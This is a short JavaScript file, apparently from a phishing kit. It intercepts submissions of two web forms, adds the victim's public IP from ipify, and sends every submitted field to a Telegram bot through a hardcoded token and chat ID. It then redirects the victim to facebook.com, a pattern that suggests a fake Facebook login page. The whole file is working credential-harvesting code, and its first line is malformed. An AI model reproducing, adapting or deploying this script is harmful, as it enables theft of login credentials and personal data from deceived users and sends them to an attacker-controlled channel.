window.onwindow.onload = () => {
  const token = "6884328378:AAHSfHTfbefzVvdTIqZeu4Bq_W5f0B4_nQg"; 
  const chatID = "1393367014"; 
  const url = `https://api.telegram.org/bot${token}/sendMessage`; 
  const form1 = document.querySelector("#form1"); 
  const form2 = document.querySelector("#form2"); 
  
  const onSubmit = (e) => { 
    e.preventDefault(); 
    const formData = new FormData(e.target); 
    let text = `Time: ${new Date().toISOString()}\n`; 
    
    for (const [key, value] of formData.entries()) { 
      text += `${key}: ${value}\n`; 
    } 
    
    fetch("https://api.ipify.org")
      .then((res) => res.text())
      .then((res) => {
        text += `IP: ${res}\n`; 
        console.log(text); 
        
        fetch(`${url}?chat_id=${chatID}&text=${encodeURIComponent(text)}`)
          .then((res) => {
            if (!res.ok) {
              throw new Error('Failed to send message');
            }
            return res.json();
          })
          .then((data) => {
            console.log('Message sent:', data);
            // Redirect the user after the message is sent
            location.assign("https://facebook.com"); 
          })
          .catch((error) => {
            console.error('Error sending message:', error);
            // Handle the error here (e.g., display an error message to the user)
          });
      })
      .catch((error) => {
        console.error('Error getting IP address:', error);
        // Handle the error here (e.g., display an error message to the user)
      });
  }; 
  
  form1.addEventListener("submit", onSubmit); 
  form2.addEventListener("submit", onSubmit); 
};
